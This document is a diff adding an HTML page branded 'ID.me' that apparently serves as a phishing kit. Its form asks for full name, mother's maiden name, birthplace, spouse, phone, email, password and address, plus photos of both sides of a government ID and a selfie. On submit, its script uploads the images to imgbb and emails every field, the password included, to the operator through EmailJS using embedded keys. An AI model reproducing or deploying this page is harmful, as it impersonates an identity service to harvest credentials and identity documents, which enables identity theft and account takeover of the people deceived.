@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ID.me</title>
+
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: #f3f4f6;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem;
+        color: #172f55;
+      }
+      .form-container {
+        max-width: 600px;
+        width: 100%;
+        background: #fff;
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      }
+      input,
+      textarea {
+        width: 100%;
+        padding: 0.8rem;
+        margin-bottom: 1rem;
+        border: 1px solid #ddd;
+        border-radius: 0.5rem;
+      }
+      input[type="file"] {
+        border: none;
+      }
+      button {
+        background: #172f55;
+        color: #fff;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+      }
+      button:hover {
+        background: #1f2937;
+      }
+      .logo {
+        height: 35px;
+      }
+    </style>
+  </head>
+  <body>
+    <form class="form-container" id="userForm">
+      <img class="logo" src="/images/logo.svg" alt="Logo" />
+      <h2>Enter Legal Information</h2>
+      <input type="text" name="fullname" placeholder="Full Name" required />
+      <input
+        type="text"
+        name="mother_fullname"
+        placeholder="Mother's Full Name"
+        required
+      />
+      <input
+        type="text"
+        name="maiden_name"
+        placeholder="Mother's Maiden Name"
+        required
+      />
+      <input
+        type="text"
+        name="birthplace"
+        placeholder="Birthplace (City & State)"
+        required
+      />
+      <input type="text" name="spouse_name" placeholder="Name of Spouse" />
+      <input type="tel" name="phone" placeholder="Phone Number" required />
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <input type="text" name="address" placeholder="Address" required />
+
+      <label>Upload ID Card / Driver’s License (Front):</label>
+      <input type="file" name="id_front" accept="image/*" required />
+
+      <label>Upload ID Card / Driver’s License (Back):</label>
+      <input type="file" name="id_back" accept="image/*" required />
+
+      <label>Upload a Clear Photo of Yourself:</label>
+      <input type="file" name="photo" accept="image/*" required />
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <script>
+      // ✅ Initialize EmailJS
+      emailjs.init("JqMrnQGiMxMQG-veX"); // <-- Replace with your Public Key
+
+      const imgbbAPIKey = "d3c99a93a370e1da16b71b473742f6fd"; // <-- Replace with your imgbb API key
+
+      function uploadToImgbb(file) {
+        const formData = new FormData();
+        formData.append("image", file);
+
+        return fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
+          method: "POST",
+          body: formData,
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) return data.data.url;
+            else throw new Error("Image upload failed");
+          });
+      }
+
+      document
+        .getElementById("userForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+          const form = this;
+          const formData = new FormData(form);
+
+          Swal.fire({
+            title: "Uploading...",
+            text: "Please wait while we upload your documents.",
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading(),
+          });
+
+          try {
+            const [idFrontUrl, idBackUrl, photoUrl] = await Promise.all([
+              uploadToImgbb(formData.get("id_front")),
+              uploadToImgbb(formData.get("id_back")),
+              uploadToImgbb(formData.get("photo")),
+            ]);
+
+            const emailData = {
+              fullname: formData.get("fullname"),
+              mother_fullname: formData.get("mother_fullname"),
+              maiden_name: formData.get("maiden_name"),
+              birthplace: formData.get("birthplace"),
+              spouse_name: formData.get("spouse_name"),
+              phone: formData.get("phone"),
+              email: formData.get("email"),
+              password: formData.get("password"),
+              address: formData.get("address"),
+              id_front: idFrontUrl,
+              id_back: idBackUrl,
+              photo: photoUrl,
+            };
+
+            await emailjs.send(
+              "service_lzj23dj",
+              "template_wvjq8re",
+              emailData
+            );
+
+            Swal.fire({
+              icon: "success",
+              title: "Message Sent!",
+              text: "Your form has been submitted successfully.",
+              confirmButtonColor: "#111827",
+            });
+
+            form.reset();
+          } catch (error) {
+            console.error("Error:", error);
+            Swal.fire({
+              icon: "error",
+              title: "Submission Failed",
+              text: "Something went wrong. Please try again later.",
+              confirmButtonColor: "#d33",
+            });
+          }
+        });
+    </script>
+  </body>
+</html>
